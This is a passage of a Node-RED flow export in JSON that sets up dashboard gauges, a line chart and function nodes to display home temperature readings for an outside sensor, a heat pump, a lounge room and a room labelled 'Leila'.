msg.payload.state.temperature/100;\nreturn msg;","outputs":1,"noerr":0,"x":980,"y":260,"wires":[["f56575c1d29952da"]]},{"id":"f56575c1d29952da","type":"ui_chart","z":"09d4f27af0752e89","name":"","group":"0b62a56ccf720e95","order":2,"width":"12","height":"7","label":"Lounge Room Temperatures","chartType":"line","legend":"true","xformat":"HH:mm","interpolate":"linear","nodata":"","dot":false,"ymin":"","ymax":"","removeOlder":"12","removeOlderPoints":"","removeOlderUnit":"3600","cutout":0,"useOneColor":false,"colors":["#ff0000","#ff8000","#ff80ff","#0000ff","#98df8a","#d62728","#ff9896","#9467bd","#c5b0d5"],"useOldStyle":false,"outputs":1,"x":1180,"y":260,"wires":[[]]},{"id":"aad1ac107f3281c6","type":"ui_gauge","z":"09d4f27af0752e89","name":"Outside","group":"104dba9b0ed114da","order":6,"width":"3","height":"3","gtype":"gage","title":"Outside","label":"units","format":"{{msg.payload.state.temperature/100}}","min":0,"max":"25","colors":["#75baff","#e6e600","#ff8000"],"seg1":"10","seg2":"15","x":1120,"y":200,"wires":[]},{"id":"0d636ad0644b085e","type":"ui_template","z":"09d4f27af0752e89","group":"9a96dc6533dbc8ae","name":"","order":7,"width":"3","height":"3","format":"<div ng-bind-html=\"msg.payload\">{{msg.payload.state.temperature/100}} &deg;</div>","storeOutMessages":true,"fwdInMessages":true,"templateScope":"local","x":980,"y":200,"wires":[["aad1ac107f3281c6"]]},{"id":"3b72884e1d3b4dd9","type":"debug","z":"09d4f27af0752e89","name":"","active":true,"tosidebar":true,"console":false,"tostatus":false,"complete":"false","x":770,"y":100,"wires":[]},{"id":"b724e760e9716320","type":"ui_gauge","z":"09d4f27af0752e89","name":"Heatpump","group":"104dba9b0ed114da","order":6,"width":"3","height":"3","gtype":"gage","title":"Heatpump","label":"units","format":"{{msg.payload.state.temperature/100}}","min":"10","max":"40","colors":["#75baff","#e6e600","#ff8000"],"seg1":"20","seg2":"30","x":1130,"y":340,"wires":[]},{"id":"20e8b1187be6af03","type":"function","z":"09d4f27af0752e89","name":"topic: Outside","func":"if (msg.payload.state === undefined)\n    return null;\n\nmsg.topic = \"Outside\";\nreturn msg;","outputs":1,"noerr":0,"x":560,"y":200,"wires":[["3b72884e1d3b4dd9","0d636ad0644b085e","646a14fe1367ca86","4e8e157241c6d62f"]]},{"id":"ef0f49a8d2b5ba93","type":"function","z":"09d4f27af0752e89","name":"topic: Leila","func":"if (msg.payload.state === undefined)\n    return null;\n\nmsg.topic = \"Leila\";\nreturn msg;","outputs":1,"noerr":0,"x":550,"y":300,"wires":[["646a14fe1367ca86","688f44a254dd7b6a"]]},{"id":"688f44a254dd7b6a","type":"ui_gauge","z":"09d4f27af0752e89","name":"Leila","group":"104dba9b0ed114da","order":6,"width":"3","height":"3","gtype":"gage","title":"Leila","label":"units","format":"{{msg.payload.state.temperature/100}}","min":"10","max":"25","colors":["#75baff","#e6e600","#ff0000"],"seg1":"15","seg2":"20","x":1110,"y":300,"wires":[]}]
